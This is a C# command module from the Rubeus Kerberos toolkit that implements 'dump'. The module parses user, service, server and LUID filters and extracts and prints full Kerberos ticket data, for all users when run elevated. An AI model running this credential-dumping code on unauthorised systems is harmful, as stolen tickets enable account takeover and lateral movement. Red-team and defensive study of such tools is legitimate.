using System;
using System.Collections.Generic;
using Rubeus.lib.Interop;


namespace Rubeus.Commands
{
    public class Dump : ICommand
    {
        public static string CommandName => "dump";

        public void Execute(Dictionary<string, string> arguments)
        {
            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine("\r\nAction: Dump Kerberos Ticket Data (All Users)\r\n");
            }
            else
            {
                Console.WriteLine("\r\nAction: Dump Kerberos Ticket Data (Current User)\r\n");
            }

            LUID targetLuid = new LUID();
            string targetUser = "";
            string targetService = "";
            string targetServer = "";

            if (arguments.ContainsKey("/luid"))
            {
                try
                {
                    targetLuid = new LUID(arguments["/luid"]);
                }
                catch
                {
                    Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/luid"]);
                    return;
                }
            }

            if (arguments.ContainsKey("/user"))
            {
                targetUser = arguments["/user"];
            }

            if (arguments.ContainsKey("/service"))
            {
                targetService = arguments["/service"];
            }

            if (arguments.ContainsKey("/server"))
            {
                targetServer = arguments["/server"];
            }

            // extract out the tickets (w/ full data) with the specified targeting options
            List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(true, targetLuid, targetService, targetUser, targetServer, true);
            // display tickets with the "Full" format
            LSA.DisplaySessionCreds(sessionCreds, LSA.TicketDisplayFormat.Full);
        }
    }
}